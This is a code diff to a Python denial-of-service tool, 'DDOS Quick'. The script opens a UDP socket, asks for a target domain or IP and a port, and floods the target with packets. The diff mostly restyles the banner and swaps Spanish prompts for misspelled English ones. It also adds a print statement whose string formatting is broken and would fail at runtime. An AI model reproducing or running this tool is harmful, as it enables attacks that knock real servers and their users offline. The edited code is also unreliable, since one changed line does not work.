@@ -24,15 +24,15 @@ def ddos():
         clearConsole()
         print(Fore.RED+'''
 
-   ⠀⢻⣿⣿⣿⣿⣦
-⠀   ⠀⢿⣿⣿⣿⣿⣷⣄⣀⣀⣀⣀⣀⣀
-   ⣠⣴⣾⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠷⠶⠶⠤⢤⣀
-   ⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀'''+Style.RESET_ALL+Fore.YELLOW+Style.BRIGHT+'''DDOS'''+Fore.RED+'''⠀⠀⠀⠀⠀⠀⠀⣿⣿⣷⣦⣄⡀
-   ⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀  ⠀'''+Fore.YELLOW+'''Quick'''+Fore.RED+'''  ⠀⠀⠀⠀⠀⣿⣿⣿⣿⠿⠛
-   ⠿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⠶⠟⠛⠉
-⠀⠀  ⣸⣿⣿⣿⣿⣿⠟⠛⠛⠛⠛⠛⠛⠛⠛⠉⠉⠉
-⠀  ⢰⣿⣿⣿⣿⡿⠃
-⠀  ⠉⠉⠉⠉⠉
+   ⠀    ⢻⣿⣿⣿⣿⣦
+⠀        ⢿⣿⣿⣿⣿⣷⣄⣀⣀⣀⣀⣀⣀
+       ⣠⣴⣾⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠷⠶⠶⠤⢤⣀
+       ⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀'''+Style.RESET_ALL+Fore.YELLOW+Style.BRIGHT+'''DDOS'''+Fore.RED+'''⠀⠀⠀⠀⠀⠀⠀⣿⣿⣷⣦⣄⡀
+       ⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀  ⠀'''+Fore.YELLOW+'''Quick'''+Fore.RED+'''  ⠀⠀⠀⠀⣿⣿⣿⣿⠿⠛
+       ⠿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⠶⠟⠛⠉
+⠀⠀        ⣸⣿⣿⣿⣿⣿⠟⠛⠛⠛⠛⠛⠛⠛⠛⠉⠉⠉
+⠀        ⢰⣿⣿⣿⣿⡿⠃
+⠀       ⠉⠉⠉⠉⠉
         '''+Style.RESET_ALL)
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -62,30 +62,32 @@ def ddos():
     try:
         while True:
             banner()
-            print(Fore.GREEN+Style.BRIGHT+"1 /> "+Style.RESET_ALL+Fore.YELLOW+" DDOS with Domin site "+Fore.GREEN+Style.BRIGHT+"\n2 />."+Style.RESET_ALL+Fore.YELLOW+" DDOS with IP site ")
-            opt=str(input(Fore.RED+Style.BRIGHT+"\nenter number for DDOS ? "+Fore.RESET))
+            print (" ")
+            print (" ")
+            print(Fore.GREEN+Style.BRIGHT+"1 /> "+Style.RESET_ALL+Fore.YELLOW+" DDOS with Domin site "+Fore.GREEN+Style.BRIGHT+"\n\n2 /> "+Style.RESET_ALL+Fore.YELLOW+" DDOS with IP site ")
+            opt=str(input(Fore.RED+Style.BRIGHT+"\nnenter number for DDOS ? "+Fore.RESET))
             if opt=='1':
-                domain=str(input(Fore.CYAN+Style.BRIGHT+"Ingrese el sitio web(ej:google.com):"+Fore.RESET))
+                domain=str(input(Fore.CYAN+Style.BRIGHT+" enter domin terget site : "+Fore.RESET))
                 ip=socket.gethostbyname(domain)
                 break
             elif opt=='2':
-                ip = input(Fore.CYAN+Style.BRIGHT+"Direccion IP  : "+Fore.RESET)
+                ip = input(Fore.CYAN+Style.BRIGHT+" enter IP site : "+Fore.RESET)
                 break
             elif opt=='3':
                 time.sleep(1)
-                print(Fore.RED+"Nos vemos pronto :D"+Fore.RESET)
+                print(Fore.RED+" Please enter the number 1 or 2 "+Fore.RESET)
                 exit()
             else:
-                print(Fore.RED+'Opcion invalida!'+Fore.RESET)
+                print(Fore.RED+'\n  Please enter the number 1 or 2 '+Fore.RESET)
                 time.sleep(2)
 
-        port =int(input(Fore.CYAN+Style.BRIGHT+"Numero del puerto  : "+Fore.RESET))
+        port =int(input(Fore.CYAN+Style.BRIGHT+"\nenter number port : "+Fore.RESET))
 
         print(Fore.YELLOW+Style.BRIGHT+"Iniciando...."+Style.RESET_ALL)
         clearConsole()
         time.sleep(2)
 
-        print(Fore.RED+Back.LIGHTGREEN_EX+"Comenzando ataque X.X ..."+Style.RESET_ALL)
+        print(Fore.RED+Back.LIGHTGREEN_EX+" Tack Lorix "+Style.RESET_ALL)
         for i in tqdm(range(30000)):
             print(end=Fore.MAGENTA+'\r')
         time.sleep(1)
@@ -103,7 +105,7 @@ def ddos():
             color_list = [Fore.RED+Style.BRIGHT+Back.MAGENTA, Fore.GREEN+Style.BRIGHT+Back.RED, Fore.YELLOW+Style.BRIGHT+Back.GREEN, Fore.BLUE+Style.BRIGHT+Back.CYAN, Fore.MAGENTA+Style.BRIGHT+Back.WHITE, Fore.CYAN+Style.BRIGHT+Back.BLUE, Fore.WHITE+Style.BRIGHT+Back.RED ]
             color_random = random.choice(color_list)
 
-            print(color_random+"Paquete %s enviado %s a través del puerto:%s" % (sent, ip, port))
+            print(color_random+"Send DDos to server" % (sent, ip, port))
             if port==65534:
                 port=1
             elif port==1900:
